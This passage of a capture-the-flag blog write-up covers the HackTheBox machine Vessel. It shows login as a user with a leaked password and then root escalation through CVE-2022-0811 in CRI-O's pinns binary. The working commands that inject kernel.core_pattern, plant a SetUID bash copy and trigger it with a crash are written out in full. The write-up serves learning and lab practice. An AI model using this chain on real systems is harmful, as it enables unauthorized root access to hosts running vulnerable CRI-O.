+<p>Using that password with <code class="language-plaintext highlighter-rouge">su</code> provides a shell as ethan:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@vessel:/home/steven$</span><span class="w"> </span>su - ethan                                
+<span class="go">Password: 
+</span><span class="gp">ethan@vessel:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>And the user flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">f0402f4f************************
+</span></code></pre></div></div>
+<p>This password also works for SSH:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'b@mPRNSVTjjLKId1T'</span> ssh ethan@vessel.htb
+<span class="go">Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)
+...[snip]...
+</span><span class="gp">ethan@vessel:~$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>There’s very little to find on this box as ethan that I haven’t already messed with. ethan isn’t in an especial groups. I’ll look for files owned by the user or group ethan, as those are things I couldn’t access as www-data:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:~$</span><span class="w"> </span>find / <span class="nt">-user</span> ethan 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-Ev</span> <span class="s1">'^/(run|sys|proc|home)'</span>
+<span class="go">/tmp/tmux-1000
+/dev/pts/2
+/dev/pts/0
+</span><span class="gp">ethan@vessel:~$</span><span class="w"> </span>find / <span class="nt">-group</span> ethan 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-Ev</span> <span class="s1">'^/(run|sys|proc|home)'</span>
+<span class="go">/usr/bin/pinns
+/tmp/tmux-1000
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/tmp/tmux-1000</code> could be interesting, but it’s just an empty directory.</p>
+<p><code class="language-plaintext highlighter-rouge">/usr/bin/pinns</code> is interesting:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/pinns 
+<span class="go">-rwsr-x--- 1 root ethan 814936 Mar 15  2022 /usr/bin/pinns
+</span></code></pre></div></div>
+<p>It is owned by root, and the ethan group can run it. It’s also SetUID, so it runs as root.</p>
+<h3 id="cve-2022-0811">CVE-2022-0811</h3>
+<h4 id="identify">Identify</h4>
+<p>I spent a while trying to figure out what this <code class="language-plaintext highlighter-rouge">pinns</code> binary is. Running it returns an error:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:~$</span><span class="w"> </span>pinns
+<span class="go">[pinns:e]: Path for pinning namespaces not specified: Invalid argument
+</span></code></pre></div></div>
+<p>Goolging for this error message didn’t get me anywhere. I also searched for the hash in <a href="https://www.virustotal.com/gui/file/6405fc112e697c27605144382aec325ebc96d3952bebc9d67797a2bface3a0b0/detection">VirusTotal</a>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321141621526.webp" type="image/webp"/>
+<img alt="image-20230321141621526" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321141621526.png"/>
+</picture>
+<p>It was first uploaded 3 hours and 42 minutes after Vessel was released, and 19 minutes after the user blood was claimed. This suggests that this binary is unique to Vessel, either a custom binary, or something that’s compiled at install.</p>
+<p>Googling for “pinns binary linux” returns a Rust-based tool on GitHub (red box), but looking at the command line args in the readme, it’s not the same thing:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321141944539.webp" type="image/webp"/>
+<img alt="image-20230321141944539" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321141944539.png"/>
+</picture>
+<p>The other interesting link (in the green box) is a reference to CVE-2022-0811, which the preview text mentions the “pinns binary”.</p>
+<p>The <a href="https://sysdig.com/blog/cve-2022-0811-cri-o/">article from sysdig</a> says that CVE-2022-0811 affects CRI-O version 1.19+. Vessel has <code class="language-plaintext highlighter-rouge">crio</code>, and it’s version 1.19.6:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:~$</span><span class="w"> </span>crio <span class="nt">--version</span>
+<span class="go">crio version 1.19.6
+Version:       1.19.6
+GitCommit:     c12bb210e9888cf6160134c7e636ee952c45c05a
+GitTreeState:  clean
+BuildDate:     2022-03-15T18:18:24Z
+GoVersion:     go1.15.2
+Compiler:      gc
+Platform:      linux/amd64
+Linkmode:      dynamic
+</span></code></pre></div></div>
+<p><a href="https://support.huaweicloud.com/eu/bulletin-cce/topic_0000001265991633.html">This advisory</a> say that the scope includes 1.19.6:</p>
+<blockquote>
+<h4 id="impact-scope">Impact Scope</h4>
+<p>\1. Kubernetes clusters that use CRI-O v1.19 or later, including patch versions 1.19.6, 1.20.7, 1.21.6, 1.22.3, 1.23.2, and 1.24.0.</p>
+<p>CCE clusters are not affected by this vulnerability because they do not use CRI-O.</p>
+</blockquote>
+<h4 id="background-1">Background</h4>
+<p>CVE-2022-0811 is a vulnerability first discovered researchers at CrowdStrike, and written up in [this <a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/">post</a>. It is a vulnerability in the CRI-O container engine, an open source container engine which can replace Docker in Kubernetes implementation such as OpenShift. The article from sysdig says:</p>
+<blockquote>
+<p>The CRI-O container engine provides a stable and performant platform for running Open Container Initiative (OCI) compatible runtimes to launch containers and pods by engaging OCI-compliant runtimes like runc.</p>
+</blockquote>
+<p>In CRI-O, <code class="language-plaintext highlighter-rouge">pinns</code> is used to set kernel options. In version 1.19, they added additional <code class="language-plaintext highlighter-rouge">sysctl</code> support, and allowed for <code class="language-plaintext highlighter-rouge">pinns</code> to set any kernel parameters it’s password without validation. While this typically will come up in the context of Kubernetes and pods, the CrowdStrike article explicitly states at the end:</p>
+<blockquote>
+<p>Kubernetes is not necessary to invoke CVE-2022-8011. An attacker on a machine with CRI-O installed can use it to set kernel parameters all by itself. We used Kubernetes in this POC to better illustrate the potential impact of the problem and to more closely simulate how this would likely be used in the wild.</p>
+</blockquote>
+<p>The issue is in how <code class="language-plaintext highlighter-rouge">pinns</code> processes multiple options in one parameter, like this:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pinns <span class="nt">-s</span> <span class="nv">kernel_parameter1</span><span class="o">=</span>value1+kernel_parameter2<span class="o">=</span>value2
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">+</code> is used to split the multiple keys, but only the first key (<code class="language-plaintext highlighter-rouge">kernel_parameter1</code> in the above example) is checked to make sure it’s a safe kernel option, and <code class="language-plaintext highlighter-rouge">kernel_parameter2</code> can be any kernel parameter.</p>
+<h4 id="modify-kernel-options-failure">Modify Kernel Options [Failure]</h4>
+<p>The goal is to change kernel options such that I get code execution. There’s a long list of kernel options <a href="https://docs.kernel.org/admin-guide/sysctl/">in the kernel docs</a>. In the CrowdStrike blog, they set <code class="language-plaintext highlighter-rouge">kernel.shm_rmid_forced=1</code> and <code class="language-plaintext highlighter-rouge">kernel.core_pattern=|[script] #</code>. They have to worry about running a script in a container from the host. Given I’m not navigating containers, my path can be much shorter. Setting the value to start with a <code class="language-plaintext highlighter-rouge">|</code> is described in the <a href="https://docs.kernel.org/admin-guide/sysctl/kernel.html#core-pattern">docs</a>:</p>
+<blockquote>
+<p>If the first character of the pattern is a ‘|’, the kernel will treat the rest of the pattern as a command to run. The core dump will be written to the standard input of that program instead of to a file.</p>
+</blockquote>
+<p>The goal is to then start a process and then make it crash, having set the kernel option to have my script called with the result.</p>
+<p>I’ll take a look at the current values of the two parameters I want to modify:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span><span class="nb">cat</span> /proc/sys/kernel/shm_rmid_forced 
+<span class="go">0
+</span><span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span><span class="nb">cat</span> /proc/sys/kernel/core_pattern 
+<span class="go">|/usr/share/apport/apport %p %s %c %d %P %E
+</span></code></pre></div></div>
+<p>It’s worth noting that there’s a cleanup script resetting these to the above values every four minutes.</p>
+<p>I’ll try to change these with <code class="language-plaintext highlighter-rouge">pinns</code>, but it doesn’t work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span>pinns <span class="nt">-s</span> <span class="s1">'kernel.shm_rmid_forced=1'</span>+<span class="s1">'kernel.core_pattern=|/tmp/exp.sh #'</span>
+<span class="go">[pinns:e]: Path for pinning namespaces not specified: Invalid argument
+</span><span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span><span class="nb">cat</span> /proc/sys/kernel/core_pattern 
+<span class="go">|/usr/share/apport/apport %p %s %c %d %P %E
+</span><span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span><span class="nb">cat</span> /proc/sys/kernel/shm_rmid_forced 
+<span class="go">0
+</span></code></pre></div></div>
+<h4 id="pinnsc-analysis">pinns.c Analysis</h4>
+<p>The source for <code class="language-plaintext highlighter-rouge">pinns</code> is fairly short (192 lines) and available on <a href="https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c">GitHub</a>. Towards the <a href="https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c#L34-L44">top</a>, it defines the options:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">option</span> <span class="n">long_options</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="p">{</span><span class="s">"help"</span><span class="p">,</span> <span class="n">no_argument</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="sc">'h'</span><span class="p">},</span>
+      <span class="p">{</span><span class="s">"uts"</span><span class="p">,</span> <span class="n">optional_argument</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="sc">'u'</span><span class="p">},</span>
+      <span class="p">{</span><span class="s">"ipc"</span><span class="p">,</span> <span class="n">optional_argument</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">},</span>
+      <span class="p">{</span><span class="s">"net"</span><span class="p">,</span> <span class="n">optional_argument</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="sc">'n'</span><span class="p">},</span>
+      <span class="p">{</span><span class="s">"user"</span><span class="p">,</span> <span class="n">optional_argument</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="sc">'U'</span><span class="p">},</span>
+      <span class="p">{</span><span class="s">"cgroup"</span><span class="p">,</span> <span class="n">optional_argument</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="sc">'c'</span><span class="p">},</span>
+      <span class="p">{</span><span class="s">"dir"</span><span class="p">,</span> <span class="n">required_argument</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="sc">'d'</span><span class="p">},</span>
+      <span class="p">{</span><span class="s">"filename"</span><span class="p">,</span> <span class="n">required_argument</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="sc">'f'</span><span class="p">},</span>
+      <span class="p">{</span><span class="s">"sysctl"</span><span class="p">,</span> <span class="n">optional_argument</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="sc">'s'</span><span class="p">},</span>
+  <span class="p">};</span>
+</code></pre></div></div>
+<p>It’s tempting to try running with <code class="language-plaintext highlighter-rouge">-h</code> or <code class="language-plaintext highlighter-rouge">--help</code>, but nothing happens.</p>
+<p>Then, <a href="https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c#L46-L91">lines 46-91</a> parse the options, and set variables based on the input. There’s also a commented out call to <code class="language-plaintext highlighter-rouge">usage()</code> (a function that doesn’t exist) when it gets to the <code class="language-plaintext highlighter-rouge">-h</code> case (which explains where there’s no help message).</p>
+<p>Now <a href="https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c#L93-L111">there’s a bunch</a> of <code class="language-plaintext highlighter-rouge">if</code> checks that if matched, exit with an error message:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pin_path</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">pexit</span><span class="p">(</span><span class="s">"Path for pinning namespaces not specified"</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">filename</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">pexit</span><span class="p">(</span><span class="s">"Filename for pinning namespaces not specified"</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">directory_exists_or_create</span><span class="p">(</span><span class="n">pin_path</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">nexitf</span><span class="p">(</span><span class="s">"%s exists but is not a directory"</span><span class="p">,</span> <span class="n">pin_path</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">num_unshares</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">nexit</span><span class="p">(</span><span class="s">"No namespace specified for pinning"</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">unshare</span><span class="p">(</span><span class="n">unshare_flags</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">pexit</span><span class="p">(</span><span class="s">"Failed to unshare namespaces"</span><span class="p">);</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+<p>The first one is the message I’m getting when I try to run. It looks like <code class="language-plaintext highlighter-rouge">-d</code>, <code class="language-plaintext highlighter-rouge">-f</code>, and one of <code class="language-plaintext highlighter-rouge">-u</code>, <code class="language-plaintext highlighter-rouge">-i</code>, <code class="language-plaintext highlighter-rouge">-n</code>, <code class="language-plaintext highlighter-rouge">-U</code>, and <code class="language-plaintext highlighter-rouge">-c</code> must be set.</p>
+<p>Then comes the important part for me - on <a href="https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c#L113-L115">lines 113-115</a> it calls <code class="language-plaintext highlighter-rouge">configure_sysctls(sysctls)</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">sysctls</span> <span class="o">&amp;&amp;</span> <span class="n">configure_sysctls</span><span class="p">(</span><span class="n">sysctls</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">pexit</span><span class="p">(</span><span class="s">"Failed to configure sysctls after unshare"</span><span class="p">);</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+<p>What happens after that isn’t super important to me, as I’ve already configured the kernel options.</p>
+<h4 id="modify-kernel-options">Modify Kernel Options</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">pinns</code> again, this time with some extra arguments, sort of guessing at things that might work. For example, the directory in <code class="language-plaintext highlighter-rouge">-d</code> has to exist or be creatable. This works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span>pinns <span class="nt">-s</span> <span class="s1">'kernel.shm_rmid_forced=1'</span>+<span class="s1">'kernel.core_pattern=|/dev/shm/exp.sh #'</span> <span class="nt">-f</span> file <span class="nt">-d</span> /dev/shm <span class="nt">-U</span>
+<span class="go">[pinns:e]: Failed to bind mount ns: /proc/self/ns/user: Operation not permitted
+</span><span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span><span class="nb">cat</span> /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced 
+<span class="go">|/def/shm/exp.sh #
+1
+</span></code></pre></div></div>
+<p>It does fail and print and error message, but the kernel options are set. There’s also a <code class="language-plaintext highlighter-rouge">userns</code> directory in <code class="language-plaintext highlighter-rouge">/dev/shm</code> (my <code class="language-plaintext highlighter-rouge">-d</code>) with a single file, <code class="language-plaintext highlighter-rouge">file</code> (my <code class="language-plaintext highlighter-rouge">-f</code>) owned by root:ethan:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span>find userns/ <span class="nt">-ls</span>
+<span class="go">        6      0 drwxr-xr-x   2 root     ethan          60 Mar 21 22:56 userns/
+        7      0 ----------   1 root     ethan           0 Mar 21 22:56 userns/file
+</span></code></pre></div></div>
+<h4 id="crash--execution">Crash –&gt; Execution</h4>
+<p>I’ll write a simple script to <code class="language-plaintext highlighter-rouge">/dev/shm/exp.sh</code> and make it executable:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4755 /tmp/0xdf'</span> | <span class="nb">tee</span> /dev/shm/exp.sh
+<span class="c">#!/bin/bash
+</span>
+<span class="nb">cp</span> /bin/bash /tmp/0xdf
+<span class="nb">chown </span>root:root /tmp/0xdf
+<span class="nb">chmod </span>4755 /tmp/0xdf
+<span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span><span class="nb">chmod</span> +x /dev/shm/exp.sh
+</code></pre></div></div>
+<p>This will make a copy of <code class="language-plaintext highlighter-rouge">bash</code> and set it SetUID. <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/core_pattern</code> already points to this script (I’ll verify again before triggering). I’ll start a sleep process in the background:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span><span class="nb">sleep </span>100&amp;
+<span class="go">[1] 202713
+</span></code></pre></div></div>
+<p>Now I’ll use <code class="language-plaintext highlighter-rouge">killall</code> to crash it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span>killall <span class="nt">-s</span> SIGSEGV <span class="nb">sleep</span>
+<span class="go">[1]+  Segmentation fault      (core dumped) sleep 100
+</span></code></pre></div></div>
+<p>There’s now a SetUID Bash binary in <code class="language-plaintext highlighter-rouge">/tmp</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp/0xdf 
+<span class="go">-rwsr-xr-x 1 root root 1183448 Mar 21 23:00 /tmp/0xdf
+</span></code></pre></div></div>
+<p>I’ll run that (with <code class="language-plaintext highlighter-rouge">-p</code> to not drop privs) to get a shell with an effective UID of root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ethan@vessel:/dev/shm$</span><span class="w"> </span>/tmp/0xdf <span class="nt">-p</span>
+<span class="go">0xdf-5.0# id
+uid=1000(ethan) gid=1000(ethan) euid=0(root) groups=1000(ethan)
+</span></code></pre></div></div>
+<p>And get the root flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">0xdf-5.0# </span><span class="nb">cat </span>root.txt
+<span class="go">efeb1ed9************************
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond root</h2>
+<p>I wanted to look a bit more at the Express / mysqljs vulnerability, more than is required to solve the box. In <a href="https://www.youtube.com/watch?v=h5itUtkr0_M">this video</a>, we’ll look at a 2014 GitHub issue, the docs for the package, explore the vulenrability, and fix the vulnerable code.</p>
+<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" height="315" src="https://www.youtube.com/embed/h5itUtkr0_M" style="border: 0px;" title="YouTube video player" width="560"></iframe>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2023/03/25/htb-vessel.html"></a>
+</article>
